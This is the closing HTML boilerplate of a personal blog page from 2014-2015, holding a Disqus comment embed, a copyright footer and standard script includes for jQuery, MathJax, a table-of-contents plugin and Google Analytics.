<section class="post-comments">
  <div id="disqus_thread"></div>
  <script type="text/javascript">
      var disqus_shortname = 'zke1ev3nme'; 
      /* * * DON'T EDIT BELOW THIS LINE * * */
      (function() {
          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>


  
</article>


            <footer class="footer">

    <span class="footer__copyright">Copyright &copy; 2014-2015 Zke1ev3n. All Rights Reserved</span>
    
</footer>

        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>


    

    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-71084152-1', 'auto');
  ga('send', 'pageview');

</script>

    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
